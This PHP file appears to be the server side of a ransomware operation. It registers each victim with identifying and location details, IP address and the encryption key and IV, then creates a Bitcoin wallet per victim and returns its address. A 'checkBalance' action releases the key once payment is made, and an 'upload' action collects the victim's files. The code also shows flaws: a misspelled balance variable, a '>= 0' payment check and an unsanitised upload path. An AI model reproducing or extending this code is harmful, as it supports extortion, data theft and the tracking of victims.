<?php

require_once 'Model/user.php';
require_once 'Model/wallet.php';


$action = $_GET['action'];

switch ($action){
    case 'add':
        if (isset($_POST['uuid']) && isset($_POST['username']) && isset($_POST['computername']) && isset($_POST['langId']) && isset($_POST['country']) && isset($_POST['region']) && isset($_POST['city']) && isset($_POST['latlong']) && isset($_POST['osversion']) && isset($_POST['key']) && isset($_POST['iv'])){
            $uuid = $_POST['uuid'];
            $username = $_POST['username'];
            $computername = $_POST['computername'];
            $langId = $_POST['langId'];
            $country = $_POST['country'];
            $region = $_POST['region'];
            $city = $_POST['city'];
            $latlong = $_POST['latlong'];
            $osversion = $_POST['osversion'];
            $key = $_POST['key'];
            $iv = $_POST['iv'];
            $ip = $_SERVER['REMOTE_ADDR'];

            $res = Users::add($uuid, $username, $computername, $langId, $country, $region, $city, $latlong, $osversion, $key, $iv, $ip);
            if($res){
                $result = BitcoinWallet::createWallet($uuid);
            } else {
                echo $res;
            }
            
        } else {
            echo json_encode(false);
        }
        break;

    case 'getPublicKey':
        if (isset($_POST['uuid'])){
            $uuid = $_POST['uuid'];
            $publicKey = BitcoinWallet::getUuidPublicKey($uuid);
            echo $publicKey["publicKey"];
        } else {
            echo json_encode(false);
        }
        break;

    case 'checkBalance':
        if (isset($_POST['uuid'])){
            $uuid = $_POST['uuid'];
            $publicKey = BitcoinWallet::getUuidPublicKey($uuid);
            $balance = BitcoinWallet::getBalanceFromUuid($publicKey[0]['publicKey']);
            if ((int)$balace >= 0){
                echo Users::getKey($uuid);
            } else {
                echo json_encode(false);
            }
        } else {
            echo json_encode(false);
        }
        break;

    case "upload":
        if (isset($_POST["uuid"]) && isset($_FILES["file"]) && isset($_POST["ext"])) {
            $targetDir = "uploads/" . $_POST["uuid"] . "/" . $_POST["ext"] . "/";
            $targetFile = $targetDir . basename($_FILES["file"]["name"]);
            if (!file_exists($targetDir)) {
                mkdir($targetDir, 0777, true);
            }
            if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
                echo json_encode(true);
            } else {
                echo json_encode(false);
            }
        }
        
    
    
        
}